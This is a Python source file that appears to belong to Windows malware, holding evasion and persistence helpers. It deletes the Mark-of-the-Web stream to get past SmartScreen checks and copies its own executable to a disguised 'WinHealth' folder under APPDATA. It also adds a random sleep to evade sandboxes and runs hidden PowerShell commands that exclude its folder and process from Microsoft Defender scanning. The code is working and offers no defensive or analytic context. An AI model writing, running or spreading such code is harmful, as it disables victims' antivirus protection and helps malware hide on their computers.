import ctypes
import os
import random
import shutil
import string
import sys
import time
from pathlib import Path

from core.logger import logger

MOTW_STREAM = ":Zone.Identifier"


def _exe_path() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable)
    return Path(sys.argv[0]).resolve()


def strip_motw(path: Path) -> bool:
    try:
        full = str(path) + MOTW_STREAM
        kernel32 = ctypes.windll.kernel32
        h = kernel32.CreateFileW(full, 0x00010000, 0, None, 3, 0, None)
        if h == -1:
            return False
        kernel32.CloseHandle(h)
        kernel32.DeleteFileW(full)
        logger.info(f"motw stripped: {path}")
        return True
    except Exception as e:
        logger.error(f"motw strip failed: {e}")
        return False


def _rand(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def self_copy() -> Path:
    try:
        base = Path(os.getenv("APPDATA", "")) / "Microsoft" / f"WinHealth_{_rand()}"
        base.mkdir(parents=True, exist_ok=True)
        dst = base / "main.exe"
        src = _exe_path()
        if src.resolve() == dst.resolve():
            return dst
        shutil.copy2(src, dst)
        strip_motw(dst)
        logger.info(f"self-copied to {dst}")
        return dst
    except Exception as e:
        logger.error(f"self copy failed: {e}")
        return _exe_path()


def sleep_jitter(min_s: int = 30, max_s: int = 90) -> None:
    t = random.randint(min_s, max_s)
    logger.info(f"jitter sleep {t}s")
    time.sleep(t)


def add_defender_exclusions() -> bool:
    try:
        import subprocess
        exe = _exe_path()
        folder = exe.parent
        cmds = [
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
             f'Add-MpPreference -ExclusionPath "{folder}" -ErrorAction SilentlyContinue'],
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
             f'Add-MpPreference -ExclusionProcess "{exe.name}" -ErrorAction SilentlyContinue'],
        ]
        ok = False
        for c in cmds:
            r = subprocess.run(c, capture_output=True, timeout=20)
            if r.returncode == 0:
                ok = True
        logger.info(f"defender exclusions added: {ok}")
        return ok
    except Exception as e:
        logger.error(f"defender exclusion failed: {e}")
        return False
